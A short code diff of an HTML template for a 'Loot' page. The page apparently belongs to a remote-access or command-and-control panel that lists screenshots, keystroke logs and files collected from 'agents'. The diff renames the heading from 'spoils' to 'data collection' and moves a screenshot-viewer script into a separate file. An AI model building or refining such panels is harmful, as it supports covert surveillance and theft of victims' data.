@@ -2,7 +2,7 @@
 <div class="max-w-7xl mx-auto">
     <div class="flex items-end justify-between mb-6">
         <div>
-            <h1 class="text-3xl font-semibold tracking-tight text-slate-900">战利品 <span class="text-amber-500">Loot</span></h1>
+            <h1 class="text-3xl font-semibold tracking-tight text-slate-900">数据收集 <span class="text-amber-500">Loot</span></h1>
             <p class="text-slate-500 mt-1 text-sm">汇总所有截图、键盘记录、下载的文件等收获</p>
         </div>
         <div class="text-right">
@@ -170,20 +170,5 @@
     </div>
 </div>
 
-<script>
-function showLootScreenshot(agentId, filename) {
-    const modal = document.getElementById('loot-modal');
-    const img = document.getElementById('modal-img');
-    const title = document.getElementById('modal-title');
-    const dl = document.getElementById('modal-download');
-
-    const src = `/screenshots/${agentId}/${filename}`;
-    img.src = src;
-    title.textContent = `${agentId} / ${filename}`;
-    dl.href = src;
-    dl.download = filename;
-
-    modal.classList.remove('hidden');
-}
-</script>
+<script src="/static/js/loot.js"></script>
 {{end}}
